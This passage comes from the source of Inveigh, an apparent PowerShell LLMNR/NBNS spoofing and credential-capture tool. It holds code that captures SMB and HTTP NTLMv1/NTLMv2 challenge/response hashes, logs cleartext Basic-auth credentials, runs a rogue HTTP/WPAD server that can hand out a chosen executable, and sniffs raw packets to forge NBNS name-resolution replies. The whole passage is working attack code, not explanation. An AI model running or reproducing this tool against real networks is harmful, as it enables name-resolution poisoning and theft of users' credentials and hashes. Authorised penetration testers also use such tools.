            $LM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""

            $NTLM_length = DataLength2 ($NTLMSSP_offset + 20) $payload_bytes
            $NTLM_offset = DataLength4 ($NTLMSSP_offset + 24) $payload_bytes
            $NTLM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""

            $domain_length = DataLength2 ($NTLMSSP_offset + 28) $payload_bytes
            $domain_offset = DataLength4 ($NTLMSSP_offset + 32) $payload_bytes
            $NTLM_domain_string = DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $payload_bytes

            $user_length = DataLength2 ($NTLMSSP_offset + 36) $payload_bytes
            $user_offset = DataLength4 ($NTLMSSP_offset + 40) $payload_bytes
            $NTLM_user_string = DataToString ($NTLMSSP_offset + $user_offset) $user_length $payload_bytes

            $host_length = DataLength2 ($NTLMSSP_offset + 44) $payload_bytes
            $host_offset = DataLength4 ($NTLMSSP_offset + 48) $payload_bytes
            $NTLM_host_string = DataToString ($NTLMSSP_offset + $host_offset) $host_length $payload_bytes

            if($NTLM_length -gt 24)
            {
                $NTLMv2_response = $NTLM_response.Insert(32,':')
                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response

                if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                {
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
                    $inveigh.NTLMv2_list.Add($NTLMv2_hash)

                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")
                    }
                    else
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
                    }

                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
                    {
                        $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash)
                        $inveigh.console_queue.Add("SMB NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                    }

                    if($inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
                    {
                        $inveigh.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
                    }

                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
                    {
                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString)
                    }

                }

            }
            elseif($NTLM_length -eq 24)
            {
                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge

                if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                {
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
                    $inveigh.NTLMv1_list.Add($NTLMv1_hash)

                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")
                    }
                    else
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
                    }

                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
                    {
                        $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash)
                        $inveigh.console_queue.Add("SMB NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                    }

                    if($inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
                    {
                        $inveigh.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
                    }

                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
                    {
                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString)
                    }

                }

            }

        }

    }

}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{ 
    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,$WPADAuth,$WPADResponse)

    function NTLMChallengeBase64
    {
        param ([String]$Challenge)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ',''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00,0x05,0x82,0x89,0xa +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge
        
        return $NTLM
    }

    $HTTP_raw_url_output = $true
    
    while($inveigh.running)
    {
        $inveigh.context = $inveigh.HTTP_listener.GetContext() 
        $inveigh.request = $inveigh.context.Request
        $inveigh.response = $inveigh.context.Response
        $NTLM = 'NTLM'
        $NTLM_auth = $false
        $basic_auth = $false
        
        if($inveigh.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        
        if($inveigh.request.RawUrl -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
        {
            $inveigh.response.StatusCode = 200
        }
        else
        {
            $inveigh.response.StatusCode = 401
        }

        $HTTP_request_time = Get-Date -format 's'
        $HTTP_source_IP = $inveigh.request.RemoteEndpoint.Address.IPAddressToString

        if($HTTP_request_time -eq $HTTP_request_time_old -and $inveigh.request.RawUrl -eq $HTTP_request_raw_url_old -and $HTTP_source_IP -eq $HTTP_request_remote_endpoint_old)
        {
            $HTTP_raw_url_output = $false
        }
        else
        {
            $HTTP_raw_url_output = $true
        }
         
        if(!$inveigh.request.headers["Authorization"] -and $inveigh.HTTP_listener.IsListening -and $HTTP_raw_url_output)
        {
            $inveigh.console_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from $HTTP_source_IP")
            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from $HTTP_source_IP")])
        }

        $HTTP_request_raw_url_old = $inveigh.request.RawUrl
        $HTTP_request_remote_endpoint_old = $HTTP_source_IP
        $HTTP_request_time_old = $HTTP_request_time
            
        [String]$authentication_header = $inveigh.request.headers.GetValues('Authorization')
        
        if($authentication_header.StartsWith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $inveigh.response.StatusCode = 401
            
            if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
            {   
                $inveigh.response.StatusCode = 401
                $NTLM = NTLMChallengeBase64 $Challenge
            }
            elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $inveigh.request.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {    
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP ($HTTP_NTLM_host_string)")])
                        $inveigh.NTLMv1_list.Add($inveigh.HTTP_NTLM_hash)
                        
                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                        {
                            $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n" + $inveigh.HTTP_NTLM_hash)
                        }
                        else
                        {
                            $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                        }
                        
                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                        {
                            $inveigh.NTLMv1_file_queue.Add($inveigh.HTTP_NTLM_hash)
                            $inveigh.console_queue.Add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }

                        if($inveigh.NTLMv1_username_list -notcontains ("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                        {
                            $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                        }

                    }

                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_list.Add($inveigh.HTTP_NTLM_hash)
                        
                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains ("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                        {
                            $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n" + $inveigh.HTTP_NTLM_hash)
                        }
                        else
                        {
                            $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                        }
                        
                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains ("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                        {
                            $inveigh.NTLMv2_file_queue.Add($inveigh.HTTP_NTLM_hash)
                            $inveigh.console_queue.Add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }

                        if($inveigh.NTLMv2_username_list -notcontains ("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                        {
                            $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                        }

                    } 

                }

                if($inveigh.IP_capture_list -notcontains $HTTP_source_IP -and -not $HTTP_NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat)
                {
                    $inveigh.IP_capture_list.Add($HTTP_source_IP)
                }
                
                $inveigh.response.StatusCode = 200
                $NTLM_auth = $true
                $NTLM_challenge = ""
                $HTTP_raw_url_output = $true

            }
            else
            {
                $NTLM = 'NTLM'
            }

        }
        elseif($authentication_header.StartsWith('Basic ')) # Thanks to @xorrior for the initial basic auth code
        {
            $inveigh.response.StatusCode = 200
            $basic_auth = $true
            $authentication_header = $authentication_header -replace 'Basic ',''
            $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authentication_header))
            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP")])
            $inveigh.cleartext_file_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + ",$HTTP_type,$cleartext_credentials")
            $inveigh.cleartext_list.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + ",$HTTP_type,$cleartext_credentials")
            $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP")

            if($inveigh.file_output)
            {
                $inveigh.console_queue.Add("$HTTP_type Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file)
            }
                 
        }

        if(($HTTPAuth -eq 'Anonymous' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Anonymous' -and $inveigh.request.RawUrl -match '/wpad.dat') -or $NTLM_Auth -or $basic_auth)
        {

            if($HTTPDir -and $HTTPDefaultEXE -and $inveigh.request.RawUrl -like '*.exe' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl)))
            {
                [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultEXE))
            }
            elseif($HTTPDir)
            {

                if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl)) -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)) -and $inveigh.request.RawUrl -notmatch '/wpad.dat')
                {
                    [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                }
                elseif($HTTPDefaultFile -and $inveigh.request.RawUrl -eq '/' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
                {
                    [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                }
                elseif($WPADResponse -and $inveigh.request.RawUrl -match '/wpad.dat')
                {
                    [Byte[]]$HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)
                }
                else
                {

                    if(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl))
                    {
                        [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $inveigh.request.RawUrl))
                    }
                    else
                    {
                        [Byte[]]$HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)
                    }
            
                }

            }
            else
            {

                if($inveigh.request.RawUrl -match '/wpad.dat')
                {
                    $inveigh.message = $WPADResponse
                }
                elseif($HTTPResponse)
                {
                    $inveigh.message = $HTTPResponse
                }
                else
                {
                    $inveigh.message = $null
                }

                [Byte[]]$HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
            }
        }
        else
        {
            [Byte[]]$HTTP_buffer = $null
        }

        if(($HTTPAuth -eq 'NTLM' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'NTLM' -and $inveigh.request.RawUrl -match '/wpad.dat') -and !$NTLM_auth)
        {
            $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
        }
        elseif(($HTTPAuth -eq 'Basic' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $inveigh.request.RawUrl -match '/wpad.dat'))
        {
            $inveigh.response.AddHeader("WWW-Authenticate","Basic realm=$HTTPBasicRealm")
        }
        else
        {
            $inveigh.response.StatusCode = 200
        }

        $inveigh.response.ContentLength64 = $HTTP_buffer.Length
        $HTTP_stream = $inveigh.response.OutputStream
        $HTTP_stream.Write($HTTP_buffer,0,$HTTP_buffer.Length)
        $HTTP_stream.Close()
    }

    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock = 
{
    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,$RunTime,$LLMNRTTL,$NBNSTTL)

    $byte_in = New-Object System.Byte[] 4	
    $byte_out = New-Object System.Byte[] 4	
    $byte_data = New-Object System.Byte[] 4096
    $byte_in[0] = 1
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $inveigh.sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $inveigh.sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
    $inveigh.sniffer_socket.ReceiveBufferSize = 1024
    $end_point = New-Object System.Net.IPEndpoint([System.Net.IPAddress]"$IP",0)
    $inveigh.sniffer_socket.Bind($end_point)
    $inveigh.sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse($LLMNR_TTL_bytes)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)
    $LLMNR_learning_log = New-Object System.Collections.Generic.List[string]
    $NBNS_learning_log = New-Object System.Collections.Generic.List[string]

    if($SpooferLearningDelay)
    {    
        $spoofer_learning_delay = New-TimeSpan -Minutes $SpooferLearningDelay
        $spoofer_learning_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    if($RunTime)
    {    
        $sniffer_timeout = New-TimeSpan -Minutes $RunTime
        $sniffer_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    while($inveigh.running)
    {
        $packet_data = $inveigh.sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
        $version_HL = $binary_reader.ReadByte()
        $type_of_service= $binary_reader.ReadByte()
        $total_length = DataToUInt16 $binary_reader.ReadBytes(2)
        $identification = $binary_reader.ReadBytes(2)
        $flags_offset = $binary_reader.ReadBytes(2)
        $TTL = $binary_reader.ReadByte()
        $protocol_number = $binary_reader.ReadByte()
        $header_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
        $source_IP_bytes = $binary_reader.ReadBytes(4)
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes(4)
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $IP_version = [Int]"0x$(('{0:X}' -f $version_HL)[0])"
        $header_length = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {

            6 
            {  # TCP
                $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $ack_number = DataToUInt32 $binary_reader.ReadBytes(12)
                $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $TCP_flags = $binary_reader.ReadByte()
                $TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
                $TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
                $TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)    
                $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))

                switch ($destination_port)
                {

                    139 
                    {
                        if($SMB -eq 'Y')
                        {

                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
                            {
                                SMBNTLMResponse $payload_bytes
                            }

                            $client_IP = ""
                            $client_port = ""
                            $NTLM_challenge = ""
                        
                        }
                    }

                    445
                    {
                     
                        if($SMB -eq 'Y')
                        {

                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
                            {
                                SMBNTLMResponse $payload_bytes
                            }

                            $client_IP = ""
                            $client_port = ""
                            $NTLM_challenge = ""

                        }
                    
                    }

                }

                # Outgoing packets
                switch ($source_port)
                {

                    139 
                    {

                        if($SMB -eq 'Y')
                        {   
                            $client_IP = $destination_IP 
                            $client_port = $destination_port
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }
                    
                    }

                    445 
                    {

                        if($SMB -eq 'Y')
                        {   
                            $client_IP = $destination_IP 
                            $client_port = $destination_port
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }
                    
                    }
                
                }

            }
                
            17 
            {  # UDP
                $source_port = $binary_reader.ReadBytes(2)
                $endpoint_source_port = DataToUInt16 ($source_port)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_uint  = DataToUInt16 ($UDP_length)
                $binary_reader.ReadBytes(2)
                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)

                # Incoming packets 
                switch($destination_port)
                {

                    137 # NBNS
                    {
                     
                        if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')
                        {
                            $UDP_length[0] += 12
                        
                            $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                    $NBNS_TTL_bytes +
                                                    0x00,0x06,0x00,0x00 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                
                            $NBNS_response_packet = 0x00,0x89 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                    $NBNS_response_data
                
                            $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                    
                            switch ($NBNS_query_type)
                            {

                                '41-41'
                                {
                                    $NBNS_query_type = '00'
                                }

                                '41-44'
                                {
                                    $NBNS_query_type = '03'
                                }

                                '43-41'
                                {
                                    $NBNS_query_type = '20'
                                }

                                '42-4C'
                                {
                                    $NBNS_query_type = '1B'
                                }

                                '42-4D'
                                {
                                    $NBNS_query_type = '1C'
                                }

                                '42-4E'
                                {
                                    $NBNS_query_type = '1D'
                                }

                                '42-4F'
                                {
                                    $NBNS_query_type = '1E'
                                }

                            }

                            $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                            $NBNS_query = $NBNS_query -replace "-00",""
                            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                            $NBNS_query_string_subtracted = ""
                            $NBNS_query_string = ""
                            $n = 0
                            
                            do
                            {
                                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                                $n += 1
                            }
                            until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    
                            $n = 0
                    
                            do
                            {
                                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                                $n += 2
                            }
                            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)

